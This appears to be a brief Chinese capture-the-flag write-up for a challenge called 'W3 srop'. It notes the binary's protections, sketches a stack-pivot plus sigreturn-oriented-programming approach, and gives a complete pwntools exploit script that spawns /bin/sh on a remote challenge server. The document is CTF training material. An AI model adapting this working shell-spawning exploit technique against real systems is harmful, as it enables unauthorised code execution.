# W3 srop

## 文件分析

NX on, PIE off, Canary off, RELRO full  
ghidra分析为64位程序

## 逆向

思路和上一题类似，先进行栈迁移，方便控制地址，然后srop

这题没有syscall，只有syscall函数，所以要注意rsp+8要可用；并且rdi是rax等

srop可以用pwntools里的工具快速生成，主要是要多次利用sigreturn改变rip，
从而控制程序走向，具体的流程可以在ctf-wiki中学习

## EXPLOIT

```python
from pwn import *
sh = remote('node4.buuoj.cn', 26073)
elf = ELF('srop')

syscall = elf.plt['syscall'] # here syscall is a libc function
main = elf.symbols['main']
popRdiAddr = 0x401203
retAddr = 0x401144
bssHigh = 0x404800

# payload 1, stack pivot to bss and read again
sh.send(b'0'*0x30 + p64(bssHigh) + p64(0x401171) + b'0'*(0x300-0x40))
sh.recv(0x30) # skip all write content

context.arch = 'amd64'
shellFrame = SigreturnFrame()
shellFrame.rdi = constants.SYS_execve
shellFrame.rsi = bssHigh - 0x30 # /bin/sh addr
shellFrame.rdx = 0
shellFrame.rcx = 0
shellFrame.rsp = bssHigh
shellFrame.rip = syscall

# payload 2, write /bin/sh to bss and invoke sigreturn to do execve
sh.sendline(b'/bin/sh\0' + b'0'*0x30 + p64(popRdiAddr) + p64(15) + p64(syscall) + bytes(shellFrame))
sh.interactive()
```

Done.
